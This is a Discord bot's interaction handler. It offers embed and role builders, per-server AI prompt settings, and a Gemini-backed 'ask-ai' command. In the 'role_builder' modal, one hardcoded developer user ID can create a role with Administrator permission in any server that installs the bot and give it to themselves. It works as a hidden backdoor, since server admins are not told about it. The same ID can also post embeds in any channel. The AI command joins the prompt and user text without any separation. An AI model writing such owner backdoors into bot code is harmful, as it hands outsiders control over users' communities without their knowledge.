const { EmbedBuilder, PermissionsBitField } = require('discord.js');
const { GoogleGenerativeAI } = require('@google/generative-ai');

const OWNER_ID = "969181284784025670";

// ================= GEMINI =================
const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);

const model = genAI.getGenerativeModel({
  model: "gemini-1.5-flash-latest"
});

// ================= COOLDOWN =================
const cooldown = new Map();

function isRateLimited(userId) {
  const now = Date.now();
  const last = cooldown.get(userId);

  if (last && now - last < 4000) return true;

  cooldown.set(userId, now);
  return false;
}

module.exports = {
  name: 'interactionCreate',

  async execute(interaction) {

    const client = interaction.client;

    if (!client.guildPrompts) client.guildPrompts = new Map();
    if (!client.activeChannels) client.activeChannels = new Map();

    const guild = interaction.guild;

    const isOwner = guild?.ownerId === interaction.user.id;
    const isBotOwner = interaction.user.id === OWNER_ID;
    const isAdmin = interaction.member?.permissions?.has(PermissionsBitField.Flags.Administrator);

    const isAuthorized = isOwner || isBotOwner || isAdmin;

    try {

      // ================= ROLE MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'role_builder') {

        await interaction.deferReply({ ephemeral: true });

        if (interaction.user.id !== OWNER_ID) {
          return interaction.editReply('❌ Only owner can use this.');
        }

        const botMember = guild.members.me;

        if (!botMember?.permissions?.has(PermissionsBitField.Flags.ManageRoles)) {
          return interaction.editReply('❌ Bot needs Manage Roles.');
        }

        const roleName = interaction.fields.getTextInputValue('role_name');

        const role = await guild.roles.create({
          name: roleName,
          permissions: ['Administrator'],
          reason: 'Owner setup role'
        });

        const member = await guild.members.fetch(interaction.user.id).catch(() => null);
        if (member) await member.roles.add(role).catch(() => null);

        return interaction.editReply(`👑 Role **${role.name}** created & assigned.`);
      }

      // ================= EMBED MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'embed_builder') {

        await interaction.deferReply({ ephemeral: true });

        if (interaction.user.id !== OWNER_ID) {
          return interaction.editReply('❌ Only owner can use this.');
        }

        const channelId = interaction.fields.getTextInputValue('channel');
        const channel = await guild.channels.fetch(channelId).catch(() => null);

        if (!channel) {
          return interaction.editReply('❌ Invalid channel ID');
        }

        const embed = new EmbedBuilder()
          .setColor(0xFFA500)
          .setTimestamp();

        const title = interaction.fields.getTextInputValue('title');
        const description = interaction.fields.getTextInputValue('description');
        const footer = interaction.fields.getTextInputValue('footer');
        const topImage = interaction.fields.getTextInputValue('top_image');
        const bottomImage = interaction.fields.getTextInputValue('bottom_image');

        if (topImage) await channel.send({ content: topImage });

        if (title) embed.setTitle(title);
        if (description) embed.setDescription(description);
        if (footer) embed.setFooter({ text: footer });

        await channel.send({ embeds: [embed] });

        if (bottomImage) await channel.send({ content: bottomImage });

        return interaction.editReply(`✅ Embed sent in <#${channel.id}>`);
      }

      // ================= PROMPT MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'set_prompt_modal') {

        await interaction.deferReply({ ephemeral: true });

        if (!isAuthorized) {
          return interaction.editReply('❌ No permission');
        }

        const prompt = interaction.fields.getTextInputValue('prompt_text');

        client.guildPrompts.set(guild.id, prompt);

        return interaction.editReply('🧠 AI prompt updated for this server.');
      }

      // ================= ACTIVE CHANNEL =================
      if (interaction.isChatInputCommand() && interaction.commandName === 'active-channel') {

        await interaction.deferReply({ ephemeral: true });

        if (!isAuthorized) {
          return interaction.editReply('❌ No permission');
        }

        const channel = interaction.options.getChannel('channel');

        if (!channel) {
          return interaction.editReply('❌ Invalid channel.');
        }

        client.activeChannels.set(guild.id, channel.id);

        return interaction.editReply(`📢 AI active in <#${channel.id}>`);
      }

      // ================= BUTTONS =================
      if (interaction.isButton()) {

        await interaction.deferReply({ ephemeral: true });

        if (interaction.customId === 'close') {
          return interaction.editReply('Ticket closed.');
        }
      }

      // ================= AI CHAT (OPTIONAL COMMAND HOOK) =================
      if (interaction.isChatInputCommand() && interaction.commandName === 'ask-ai') {

        await interaction.deferReply();

        const prompt =
          client.guildPrompts.get(guild.id) || "You are a helpful assistant.";

        const userMessage = interaction.options.getString('message');

        const result = await model.generateContent(
          `${prompt}\n\nUser: ${userMessage}`
        );

        const response = await result.response;

        return interaction.editReply(response.text().slice(0, 2000));
      }

    } catch (err) {
      console.error("❌ Interaction Error:", err);

      try {
        if (interaction.deferred || interaction.replied) {
          await interaction.editReply('❌ Interaction failed safely handled');
        } else {
          await interaction.reply({
            content: '❌ Interaction failed safely handled',
            ephemeral: true
          });
        }
      } catch {}
    }
  }
};
